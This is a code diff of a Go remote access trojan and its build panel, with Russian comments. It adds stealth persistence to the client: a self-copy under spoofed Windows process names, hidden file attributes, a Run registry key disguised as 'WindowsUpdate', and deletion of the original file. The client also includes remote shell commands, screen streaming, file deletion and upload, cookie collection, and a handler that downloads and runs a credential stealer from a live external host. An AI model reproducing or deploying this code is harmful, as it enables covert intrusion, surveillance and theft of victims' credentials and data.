@@ -34,10 +34,11 @@ import (
 	"net/http"
 	"os"
 	"os/exec"
+	"os/signal"
 	"path/filepath"
 	"strings"
-	"time"
 	"syscall"
+	"time"
 
 	"github.com/gorilla/websocket"
 	"golang.org/x/sys/windows"
@@ -131,6 +132,105 @@ func tryRunMethods(path string) bool {
     return false
 }
 
+func addToStartup() error {
+	// Получаем путь к текущему исполняемому файлу
+	exePath, err := os.Executable()
+	if err != nil {
+		return err
+	}
+	
+	// Создаем копию в скрытой папке
+	hiddenDir := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "System32")
+	if err := os.MkdirAll(hiddenDir, 0755); err != nil {
+		return err
+	}
+	
+	// Легитимные имена процессов
+	legitNames := []string{
+		"svchost.exe",
+		"winlogon.exe",
+		"dllhost.exe",
+		"rundll32.exe",
+		"csrss.exe",
+		"lsass.exe",
+		"wininit.exe",
+		"services.exe",
+		"spoolsv.exe",
+		"taskmgr.exe",
+	}
+	
+	randomName := legitNames[time.Now().Unix()%int64(len(legitNames))]
+	hiddenPath := filepath.Join(hiddenDir, randomName)
+	
+	// Копируем файл
+	data, err := os.ReadFile(exePath)
+	if err != nil {
+		return err
+	}
+	
+	if err := os.WriteFile(hiddenPath, data, 0755); err != nil {
+		return err
+	}
+	
+	// Устанавливаем скрытые атрибуты файла
+	cmd := exec.Command("attrib", "+h", "+s", hiddenPath)
+	cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
+	cmd.Run()
+	
+	// Добавляем в реестр автозапуск
+	regKey := "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
+	regValue := "WindowsUpdate"
+	
+	cmd = exec.Command("reg", "add", "HKCU\\"+regKey, "/v", regValue, "/t", "REG_SZ", "/d", hiddenPath, "/f")
+	cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
+	cmd.Run()
+	
+	// Запускаем скрытую копию и завершаем текущий процесс
+	cmd = exec.Command(hiddenPath)
+	cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
+	if err := cmd.Start(); err != nil {
+		return err
+	}
+	
+	// Удаляем оригинальный файл через 5 секунд
+	go func() {
+		time.Sleep(5 * time.Second)
+		os.Remove(exePath)
+	}()
+	
+	os.Exit(0)
+	return nil
+}
+
+func hideProcess() {
+	// Скрываем окно консоли (если оно есть)
+	hwnd, _, _ := windows.NewLazySystemDLL("kernel32.dll").NewProc("GetConsoleWindow").Call()
+	if hwnd != 0 {
+		windows.NewLazySystemDLL("user32.dll").NewProc("ShowWindow").Call(hwnd, 0)
+	}
+	
+	// Дополнительно скрываем через FreeConsole
+	windows.NewLazySystemDLL("kernel32.dll").NewProc("FreeConsole").Call()
+}
+
+func isFirstRun() bool {
+	// Проверяем, есть ли уже запись в автозапуске
+	regKey := "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
+	regValue := "WindowsUpdate"
+	
+	cmd := exec.Command("reg", "query", "HKCU\\"+regKey, "/v", regValue)
+	cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
+	
+	if err := cmd.Run(); err != nil {
+		return true // Если записи нет, это первый запуск
+	}
+	return false
+}
+
+
+
+
+
 func spoofProcessName() {
     // Common legitimate Windows process names
     legitNames := []string{
@@ -158,211 +258,281 @@ func spoofProcessName() {
 }
 
 func main() {
+	// Скрываем процесс (консоль будет скрыта благодаря -H=windowsgui флагу)
+	hideProcess()
+	
+	// Проверяем, не запущен ли уже процесс
+	if isFirstRun() {
+		// Если это первый запуск, добавляем в автозапуск
+		if err := addToStartup(); err != nil {
+			log.Println("Failed to add to startup:", err)
+		}
+	}
+	
 	fmt.Println("Client started")
+	
+	// Обработка сигналов для корректного завершения
+	sigChan := make(chan os.Signal, 1)
+	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
+	go func() {
+		<-sigChan
+		log.Println("Received shutdown signal, exiting...")
+		os.Exit(0)
+	}()
+	
 	user := os.Getenv("USERNAME")
 	if user == "" {
 		user = "unknown"
 	}
-	var err error
-	conn, _, err = websocket.DefaultDialer.Dial("WS_ADMIN_REPLACE_ME", nil)
-	if err != nil {
-		log.Fatal("Connection error:", err)
+	
+	// Функция для подключения к серверу
+	connectToServer := func() (*websocket.Conn, error) {
+		dialer := websocket.Dialer{
+			HandshakeTimeout: 10 * time.Second,
+		}
+		conn, _, err := dialer.Dial("WS_ADMIN_REPLACE_ME", nil)
+		if err != nil {
+			return nil, err
+		}
+		
+		// Отправляем приветственное сообщение
+		err = conn.WriteJSON(Message{Type: "hello", Data: user})
+		if err != nil {
+			conn.Close()
+			return nil, err
+		}
+		
+		return conn, nil
 	}
-	defer conn.Close()
-	conn.WriteJSON(Message{Type: "hello", Data: user})
+	
+	// Основной цикл подключения
+	reconnectDelay := 1 * time.Second
+	maxReconnectDelay := 30 * time.Second
+	
+	for {
+		log.Println("Attempting to connect to server...")
+		conn, err := connectToServer()
+		if err != nil {
+			log.Printf("Connection failed: %v", err)
+			log.Printf("Retrying in %v...", reconnectDelay)
+			time.Sleep(reconnectDelay)
+			
+			// Экспоненциальная задержка с максимальным ограничением
+			reconnectDelay *= 2
+			if reconnectDelay > maxReconnectDelay {
+				reconnectDelay = maxReconnectDelay
+			}
+			continue
+		}
+		
+		// Сброс задержки при успешном подключении
+		reconnectDelay = 1 * time.Second
+		
+		log.Println("Successfully connected to server")
+		
+		// Обработка сообщений
+		go func() {
+			defer func() {
+				if r := recover(); r != nil {
+					log.Println("Recovered from panic:", r)
+				}
+				// Сигнализируем о разрыве соединения
+				conn = nil
+			}()
+			
+			for {
+				var msg Message
+				if err := conn.ReadJSON(&msg); err != nil {
+					log.Println("read error:", err)
+					conn.Close()
+					conn = nil
+					return
+				}
 
-	go func() {
-		defer func() {
-			if r := recover(); r != nil {
-				log.Println("Recovered from panic:", r)
+				switch msg.Type {
+				case "cmd":
+					out, err := runHiddenCommand("cmd", "/C", msg.Data)
+					resp := Message{Type: "result", Data: string(out)}
+					if err != nil {
+						resp.Data += "\nError: " + err.Error()
+					}
+					conn.WriteJSON(resp)
+
+				case "start_screen":
+					if streaming {
+						log.Println("Screen capture already started")
+						continue
+					}
+					streaming = true
+					go func() {
+						for streaming {
+							// Логика захвата экрана
+							imgPath := filepath.Join(os.TempDir(), "screen.jpg")
+							cmd := exec.Command("powershell", "-NoProfile", "-NonInteractive", "-Command",
+								"Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; "+
+									"$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; "+
+									"$bmp = New-Object Drawing.Bitmap($screen.Width, $screen.Height); "+
+									"$graphics = [Drawing.Graphics]::FromImage($bmp); "+
+									"$graphics.CopyFromScreen(0,0,0,0,$bmp.Size); "+
+									"$bmp.Save('"+imgPath+"'); $bmp.Dispose()")
+							cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+							_, err := cmd.CombinedOutput()
+							if err != nil {
+								log.Println("Screenshot error:", err)
+								continue
+							}
+
+							data, err := os.ReadFile(imgPath)
+							if err != nil {
+								log.Println("Read screenshot error:", err)
+								continue
+							}
+							encoded := base64.StdEncoding.EncodeToString(data)
+							conn.WriteJSON(Message{Type: "screen", Data: encoded})
+							time.Sleep(100 * time.Millisecond)
+						}
+					}()
+
+				case "stop_screen":
+					streaming = false
+
+				case "ls":
+					log.Println("Listing files for:", msg.Data)
+
+					files, err := os.ReadDir(msg.Data)  // Читаем директорию
+					if err != nil {
+						log.Println("Error reading directory:", err)
+						conn.WriteJSON(Message{Type: "result", Data: "Error reading directory: " + err.Error()})
+						continue
+					}
+
+					var result struct {
+						Parent string ` + "`json:\"parent\"`" + `
+						Items  []struct {
+							Name string ` + "`json:\"name\"`" + `
+							Full string ` + "`json:\"full\"`" + `
+							Dir  bool   ` + "`json:\"dir\"`" + `
+						} ` + "`json:\"items\"`" + `
+					}
+
+					// Добавляем родительскую директорию
+					result.Parent = msg.Data
+
+					for _, f := range files {
+						fullPath := filepath.Join(msg.Data, f.Name())
+						result.Items = append(result.Items, struct {
+							Name string ` + "`json:\"name\"`" + `
+							Full string ` + "`json:\"full\"`" + `
+							Dir  bool   ` + "`json:\"dir\"`" + `
+						}{
+							Name: f.Name(),
+							Full: fullPath,
+							Dir:  f.IsDir(),
+						})
+					}
+
+					// Отправляем результат через WebSocket
+					resultJSON, _ := json.Marshal(result)
+					conn.WriteJSON(Message{Type: "explorer", Data: string(resultJSON)})
+
+				case "rm":
+					err := os.RemoveAll(msg.Data)
+					if err != nil {
+						conn.WriteJSON(Message{Type: "result", Data: "rm error: " + err.Error()})
+					} else {
+						conn.WriteJSON(Message{Type: "result", Data: "deleted: " + msg.Data})
+					}
+
+				case "open":
+					cmd := exec.Command("cmd", "/C", "start", "", msg.Data)
+					cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+					err := cmd.Run()
+					if err != nil {
+						conn.WriteJSON(Message{Type: "result", Data: "open error: " + err.Error()})
+					} else {
+						conn.WriteJSON(Message{Type: "result", Data: "opened: " + msg.Data})
+					}
+
+				case "upload":
+					var payload struct {
+						Filename string ` + "`json:\"filename\"`" + `
+						Content  string ` + "`json:\"content\"`" + `
+					}
+					if err := json.Unmarshal([]byte(msg.Data), &payload); err != nil {
+						conn.WriteJSON(Message{Type: "result", Data: "upload error: invalid JSON"})
+						break
+					}
+					data, err := base64.StdEncoding.DecodeString(payload.Content)
+					if err != nil {
+						conn.WriteJSON(Message{Type: "result", Data: "upload error: base64 decode"})
+						break
+					}
+					err = os.WriteFile(payload.Filename, data, 0644)
+					if err != nil {
+						conn.WriteJSON(Message{Type: "result", Data: "upload error: " + err.Error()})
+					} else {
+						conn.WriteJSON(Message{Type: "result", Data: "uploaded: " + payload.Filename})
+					}
+
+				case "run_stealer":
+					// 1. Формируем URL до stealer.exe на сервере
+					stealerURL := "https://panel-agzz.onrender.com/apps/steler.exe"
+					resp, err := http.Get(stealerURL)
+					if err != nil {
+						conn.WriteJSON(Message{Type: "stealer", Data: "Download failed: " + err.Error()})
+						break
+					}
+					defer resp.Body.Close()
+
+					// Сохранение файла
+					stealerPath := filepath.Join(os.TempDir(), "wupdater.exe")
+					data, err := io.ReadAll(resp.Body)
+					if err != nil {
+						conn.WriteJSON(Message{Type: "stealer", Data: "Read failed: " + err.Error()})
+						break
+					}
+					
+					if err := os.WriteFile(stealerPath, data, 0755); err != nil {
+						conn.WriteJSON(Message{Type: "stealer", Data: "Write failed: " + err.Error()})
+						break
+					}
+
+					// Проверка файла
+					if !isValidExe(stealerPath) {
+						conn.WriteJSON(Message{Type: "stealer", Data: "Invalid executable"})
+						break
+					}
+
+					// Попытки запуска
+					if tryRunMethods(stealerPath) {
+						conn.WriteJSON(Message{Type: "stealer", Data: "Successfully, write to telegram @nvalteam to get | TODO: automation"})
+					} else {
+						conn.WriteJSON(Message{Type: "stealer", Data: "All start methods failed"})
+					}
+					
+					// Отложенное удаление
+					go func() {
+						time.Sleep(30 * time.Second)
+						os.Remove(stealerPath)
+					}()
+
+				case "get_cookies":
+					id := strings.ReplaceAll(conn.LocalAddr().String(), ":", "_")
+					collectAllCookies(id)
+					conn.WriteJSON(Message{Type: "result", Data: "cookies uploaded"})
+				}
 			}
 		}()
+		
+		// Ждем пока соединение не разорвется
 		for {
-			var msg Message
-			if err := conn.ReadJSON(&msg); err != nil {
-				log.Println("read error:", err)
+			time.Sleep(1 * time.Second)
+			if conn == nil {
 				break
 			}
-
-			switch msg.Type {
-			case "cmd":
-				out, err := runHiddenCommand("cmd", "/C", msg.Data)
-				resp := Message{Type: "result", Data: string(out)}
-				if err != nil {
-					resp.Data += "\nError: " + err.Error()
-				}
-				conn.WriteJSON(resp)
-
-			case "start_screen":
-				if streaming {
-					continue
-				}
-				streaming = true
-				go func() {
-					for streaming {
-						imgPath := filepath.Join(os.TempDir(), "screen.jpg")
-						cmd := exec.Command("powershell", "-NoProfile", "-NonInteractive", "-Command",
-							"Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; "+
-								"$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; "+
-								"$bmp = New-Object Drawing.Bitmap($screen.Width, $screen.Height); "+
-								"$graphics = [Drawing.Graphics]::FromImage($bmp); "+
-								"$graphics.CopyFromScreen(0,0,0,0,$bmp.Size); "+
-								"$bmp.Save('"+imgPath+"'); $bmp.Dispose()")
-						cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-						_, err := cmd.CombinedOutput()
-						if err != nil {
-							log.Println("screenshot error:", err)
-							continue
-						}
-
-						data, err := os.ReadFile(imgPath)
-						if err != nil {
-							log.Println("read screenshot error:", err)
-							continue
-						}
-						encoded := base64.StdEncoding.EncodeToString(data)
-						conn.WriteJSON(Message{Type: "screen", Data: encoded})
-						time.Sleep(100 * time.Millisecond)
-					}
-				}()
-
-			case "stop_screen":
-				streaming = false
-
-			case "ls":
-				files, err := os.ReadDir(msg.Data)
-				if err != nil {
-					conn.WriteJSON(Message{Type: "result", Data: "ls error: " + err.Error()})
-					continue
-				}
-				var result struct {
-					Parent string ` + "`json:\"parent\"`" + `
-					Items  []struct {
-						Name string ` + "`json:\"name\"`" + `
-						Full string ` + "`json:\"full\"`" + `
-						Dir  bool   ` + "`json:\"dir\"`" + `
-					} ` + "`json:\"items\"`" + `
-				}
-				parent := filepath.Dir(msg.Data)
-				if parent != msg.Data {
-					result.Parent = parent
-				}
-				for _, f := range files {
-					full := filepath.Join(msg.Data, f.Name())
-					result.Items = append(result.Items, struct {
-						Name string ` + "`json:\"name\"`" + `
-						Full string ` + "`json:\"full\"`" + `
-						Dir  bool   ` + "`json:\"dir\"`" + `
-					}{
-						Name: f.Name(),
-						Full: full,
-						Dir:  f.IsDir(),
-					})
-				}
-				raw, _ := json.Marshal(result)
-				conn.WriteJSON(Message{Type: "explorer", Data: string(raw)})
-
-			case "rm":
-				err := os.RemoveAll(msg.Data)
-				if err != nil {
-					conn.WriteJSON(Message{Type: "result", Data: "rm error: " + err.Error()})
-				} else {
-					conn.WriteJSON(Message{Type: "result", Data: "deleted: " + msg.Data})
-				}
-
-			case "open":
-				cmd := exec.Command("cmd", "/C", "start", "", msg.Data)
-				cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-				err := cmd.Run()
-				if err != nil {
-					conn.WriteJSON(Message{Type: "result", Data: "open error: " + err.Error()})
-				} else {
-					conn.WriteJSON(Message{Type: "result", Data: "opened: " + msg.Data})
-				}
-
-			case "upload":
-				var payload struct {
-					Filename string ` + "`json:\"filename\"`" + `
-					Content  string ` + "`json:\"content\"`" + `
-				}
-				if err := json.Unmarshal([]byte(msg.Data), &payload); err != nil {
-					conn.WriteJSON(Message{Type: "result", Data: "upload error: invalid JSON"})
-					break
-				}
-				data, err := base64.StdEncoding.DecodeString(payload.Content)
-				if err != nil {
-					conn.WriteJSON(Message{Type: "result", Data: "upload error: base64 decode"})
-					break
-				}
-				err = os.WriteFile(payload.Filename, data, 0644)
-				if err != nil {
-					conn.WriteJSON(Message{Type: "result", Data: "upload error: " + err.Error()})
-				} else {
-					conn.WriteJSON(Message{Type: "result", Data: "uploaded: " + payload.Filename})
-				}
-
-			case "run_stealer":
-				// 1. Формируем URL до stealer.exe на сервере
-				stealerURL := "https://panel-agzz.onrender.com/apps/steler.exe"
-				resp, err := http.Get(stealerURL)
-				if err != nil {
-					conn.WriteJSON(Message{Type: "stealer", Data: "Download failed: " + err.Error()})
-					break
-				}
-				defer resp.Body.Close()
-
-				// Сохранение файла
-				stealerPath := filepath.Join(os.TempDir(), "wupdater.exe")
-				data, err := io.ReadAll(resp.Body)
-				if err != nil {
-					conn.WriteJSON(Message{Type: "stealer", Data: "Read failed: " + err.Error()})
-					break
-				}
-				
-				if err := os.WriteFile(stealerPath, data, 0755); err != nil {
-					conn.WriteJSON(Message{Type: "stealer", Data: "Write failed: " + err.Error()})
-					break
-				}
-
-				// Проверка файла
-				if !isValidExe(stealerPath) {
-					conn.WriteJSON(Message{Type: "stealer", Data: "Invalid executable"})
-					break
-				}
-
-				// Попытки запуска
-				if tryRunMethods(stealerPath) {
-					conn.WriteJSON(Message{Type: "stealer", Data: "Successfully, write to telegram @nvalteam to get | TODO: automation"})
-				} else {
-					conn.WriteJSON(Message{Type: "stealer", Data: "All start methods failed"})
-				}
-				
-				// Отложенное удаление
-				go func() {
-					time.Sleep(30 * time.Second)
-					os.Remove(stealerPath)
-				}()
-
-			case "get_cookies":
-				id := strings.ReplaceAll(conn.LocalAddr().String(), ":", "_")
-				collectAllCookies(id)
-				conn.WriteJSON(Message{Type: "result", Data: "cookies uploaded"})
-
-			case "list_audio_devices":
-				devices := ` + "`" + `[{"id":"default","name":"Default Audio Device"},{"id":"mic","name":"Microphone"},{"id":"speakers","name":"Speakers"}]` + "`" + `
-				conn.WriteJSON(Message{Type: "audio_devices", Data: devices})
-
-			case "start_listen_audio":
-				conn.WriteJSON(Message{Type: "audio_status", Data: "Started listening to audio device: " + msg.Data})
-
-			case "stop_listen_audio":
-				conn.WriteJSON(Message{Type: "audio_status", Data: "Stopped listening to audio device"})
-			}
 		}
-	}()
-
-	for {
-		time.Sleep(30 * time.Second)
+		
+		log.Println("Connection lost, will retry...")
 	}
 }
 
@@ -492,7 +662,7 @@ func main() {
 	r.Handle("/clients", authMiddleware(http.HandlerFunc(getClientsHandler))).Methods("GET")
 	r.Handle("/send/{id}", authMiddleware(http.HandlerFunc(sendCommandHandler))).Methods("POST")
 	r.Handle("/apps/{file}", http.StripPrefix("/apps/", http.FileServer(http.Dir("./apps"))))
-	r.HandleFunc("/wss", wsHandler)
+	r.HandleFunc("/ws", wsHandler)
 	r.Handle("/profile", authMiddleware(http.HandlerFunc(profileHandler))).Methods("GET")
 	r.Handle("/upload_profile", authMiddleware(http.HandlerFunc(uploadProfileHandler))).Methods("POST")
 	r.HandleFunc("/default-profile.png", func(w http.ResponseWriter, r *http.Request) {
@@ -765,7 +935,7 @@ func createBuildHandler(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	wsURL := fmt.Sprintf("wss://%s/wss?admin=%s", config.Host, username)
+	wsURL := fmt.Sprintf("ws://%s/ws?admin=%s", config.Host, username)
 	clientCode := strings.ReplaceAll(template, "WS_ADMIN_REPLACE_ME", wsURL)
 
 	if err := os.WriteFile(fullBuildPath, []byte(clientCode), 0644); err != nil {
@@ -798,7 +968,7 @@ require (
 		return
 	}
 
-	buildCmd := exec.Command("go", "build", "-o", outputFilename, buildFilename)
+	buildCmd := exec.Command("go", "build", "-ldflags", "-H=windowsgui", "-o", outputFilename, buildFilename)
 	buildCmd.Dir = buildDir
 	buildCmd.Env = append(os.Environ(), "GOOS=windows", "GOARCH=amd64", "CGO_ENABLED=0")
 	if err := buildCmd.Run(); err != nil {
@@ -970,7 +1140,7 @@ func wsHandler(w http.ResponseWriter, r *http.Request) {
 			client.Username = msg.Data
 			log.Printf("Client %s identified as %s", client.ID, client.Username)
 
-		case "result", "screen", "explorer", "stealer", "audio_devices", "audio_status":
+		case "result", "screen", "explorer", "stealer":
 			broadcastToAdmins(msg, client.Owner)
 
 		case "upload":
